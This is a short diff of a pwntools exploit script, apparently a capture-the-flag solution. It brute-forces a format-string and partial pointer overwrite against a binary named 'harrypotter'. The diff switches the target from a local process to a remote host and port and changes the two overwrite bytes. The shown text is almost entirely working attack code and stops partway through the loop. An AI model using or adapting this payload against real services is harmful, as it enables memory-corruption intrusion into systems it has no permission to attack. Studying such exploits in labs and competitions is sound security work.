@@ -2,14 +2,14 @@ from pwn import *
 
 i = 0
 while True:
-	r = process("./harrypotter")
-	#r = remote("125.235.240.168",27017)
+	#r = process("./harrypotter")
+	r = remote("125.235.240.168",27017)
 	context.log_level = "critical"
 	print i
 	i += 1
 	payload = '%12$s'
 	payload = payload.ljust(0x30,'B')
-	payload += "\x60\xdc"
+	payload += "\x70\x74"
 	r.recvuntil("It's time to cast your spell\n")
 	r.send(payload)
 	try:
